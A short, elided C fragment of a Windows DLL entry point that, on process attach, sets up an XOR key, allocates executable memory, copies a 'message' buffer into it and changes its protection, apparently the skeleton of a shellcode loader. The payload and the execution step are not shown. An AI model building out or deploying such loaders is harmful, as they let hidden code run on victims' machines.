...
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        ...
        unsigned char key[] = {0xAA, 0xCC, 0x23, 0xf0}; 
        

        LPVOID hHandler = VirtualAlloc(NULL, sizeof(message), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        memcpy(hHandler, message, sizeof(message));

        DWORD oldProtect;

        BOOL bVirtual = VirtualProtect(hHandler, sizeof(message), PAGE_EXECUTE_READWRITE, &oldProtect);
